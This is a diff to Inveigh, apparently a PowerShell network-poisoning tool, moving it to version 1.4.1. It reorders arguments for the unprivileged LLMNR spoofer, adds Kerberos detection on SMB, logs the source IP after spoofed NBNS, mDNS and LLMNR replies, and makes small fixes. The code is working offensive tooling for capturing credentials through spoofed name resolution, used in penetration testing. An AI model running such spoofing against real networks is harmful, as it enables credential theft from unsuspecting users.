@@ -448,7 +448,7 @@ if($invalid_parameter)
     throw
 }
 
-$inveigh_version = "1.4"
+$inveigh_version = "1.4.1"
 
 if(!$IP)
 { 
@@ -655,6 +655,7 @@ if($StartupChecks -eq 'Y')
     if($LLMNR -eq 'Y' -and !$elevated_privilege)
     {
         $LLMNR_port_check = netstat -anp UDP | findstr /C:"0.0.0.0:5355 "
+        $LLMNR_port_check = $false
     }
 
     if($mDNS -eq 'Y' -and !$elevated_privilege)
@@ -800,11 +801,6 @@ catch
 {
     $inveigh.DNS_domain = $inveigh.netBIOS_domain
     $inveigh.DNS_computer_name = $inveigh.computer_name
-}
-
-if($inveigh.relay_running)
-{
-  #  $inveigh.output_pause = $true
 }
 
 #endregion
@@ -2543,6 +2539,13 @@ $SMB_NTLM_functions_scriptblock =
             $inveigh.SMB_session_table.Add($Session,"")
         }
 
+        $SMB_index = $payload_converted.IndexOf("2A864886F712010202")
+
+        if($SMB_index -gt 0 -and $SourceIP -ne $IP)
+        {
+            $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($Port) authentication method is Kerberos for $Session") > $null
+        }
+
     }
 
     function Get-SMBNTLMChallenge
@@ -3445,6 +3448,7 @@ $sniffer_scriptblock =
                 $TCP_header_length = [Int]"0x$(('{0:X}' -f $binary_reader.ReadByte())[0])" * 4
                 $binary_reader.ReadBytes(7) > $null
                 $payload_bytes = $binary_reader.ReadBytes($total_length - ($header_length + $TCP_header_length))
+
                 switch ($destination_port)
                 {
 
@@ -3683,6 +3687,7 @@ $sniffer_scriptblock =
                                         $NBNS_send_socket.SendTo($NBNS_response_packet,$NBNS_destination_point) > $null
                                         $NBNS_send_socket.Close()
                                         $NBNS_response_message = "[response sent]"
+                                        $connection_check_IP = $source_IP
                                     }
                                     else
                                     {
@@ -3765,6 +3770,7 @@ $sniffer_scriptblock =
                                     $send_socket.SendTo($mDNS_response_packet,$destination_point) > $null
                                     $send_socket.Close()
                                     $mDNS_response_message = "[response sent]"
+                                    $connection_check_IP = $source_IP
                                 }
                                 else
                                 {
@@ -3932,6 +3938,7 @@ $sniffer_scriptblock =
                                         $LLMNR_send_socket.SendTo($LLMNR_response_packet,$LLMNR_destination_point) > $null
                                         $LLMNR_send_socket.Close()
                                         $LLMNR_response_message = "[response sent]"
+                                        $connection_check_IP = $source_IP
                                     }
                                     else
                                     {
@@ -3998,10 +4005,10 @@ $sniffer_scriptblock =
 # Unprivileged LLMNR Spoofer ScriptBlock 
 $LLMNR_spoofer_scriptblock = 
 {
-    param ($Inspect,$LLMNR_response_message,$SpooferIP,$SpooferHostsReply,$SpooferHostsIgnore,$SpooferIPsReply,$SpooferIPsIgnore,$LLMNRTTL)
+    param ($Inspect,$LLMNR_response_message,$LLMNRTTL,$SpooferIP,$SpooferHostsReply,$SpooferHostsIgnore,$SpooferIPsReply,$SpooferIPsIgnore,$SpooferNonprintable)
 
     $LLMNR_running = $true
-    $LLMNR_listener_endpoint = New-object System.Net.IPEndPoint ([IPAddress]::Any,5355)
+    $LLMNR_listener_endpoint = New-Object System.Net.IPEndPoint ([IPAddress]::Any,5355)
 
     try
     {
@@ -4029,7 +4036,7 @@ $LLMNR_spoofer_scriptblock =
         catch
         {
             $LLMNR_UDP_client.Close()
-            $LLMNR_UDP_client = new-Object System.Net.Sockets.UdpClient 5355
+            $LLMNR_UDP_client = New-Object System.Net.Sockets.UdpClient 5355
             $LLMNR_multicast_group = [IPAddress]"224.0.0.252"
             $LLMNR_UDP_client.JoinMulticastGroup($LLMNR_multicast_group)
             $LLMNR_UDP_client.Client.ReceiveTimeout = 5000
@@ -4069,7 +4076,7 @@ $LLMNR_spoofer_scriptblock =
                 $LLMNR_UDP_client.Connect($LLMNR_destination_endpoint)
                 $LLMNR_UDP_client.Send($LLMNR_response_packet,$LLMNR_response_packet.Length)
                 $LLMNR_UDP_client.Close()
-                $LLMNR_UDP_client = new-Object System.Net.Sockets.UdpClient 5355
+                $LLMNR_UDP_client = New-Object System.Net.Sockets.UdpClient 5355
                 $LLMNR_multicast_group = [IPAddress]"224.0.0.252"
                 $LLMNR_UDP_client.JoinMulticastGroup($LLMNR_multicast_group)
                 $LLMNR_UDP_client.Client.ReceiveTimeout = 5000
@@ -4816,9 +4823,9 @@ function LLMNRSpoofer
     $LLMNR_spoofer_powershell.Runspace = $LLMNR_spoofer_runspace
     $LLMNR_spoofer_powershell.AddScript($shared_basic_functions_scriptblock) > $null
     $LLMNR_spoofer_powershell.AddScript($LLMNR_spoofer_scriptblock).AddArgument($Inspect).AddArgument(
-        $LLMNR_response_message).AddArgument($SpooferIP).AddArgument($SpooferHostsReply).AddArgument(
-        $SpooferHostsIgnore).AddArgument($SpooferIPsReply).AddArgument($SpooferIPsIgnore).AddArgument(
-        $SpooferNonprintable).AddArgument($LLMNRTTL) > $null
+        $LLMNR_response_message).AddArgument($LLMNRTTL).AddArgument($SpooferIP).AddArgument(
+        $SpooferHostsReply).AddArgument($SpooferHostsIgnore).AddArgument($SpooferIPsReply).AddArgument(
+        $SpooferIPsIgnore).AddArgument($SpooferNonprintable) > $null
     $LLMNR_spoofer_powershell.BeginInvoke() > $null
 }
 
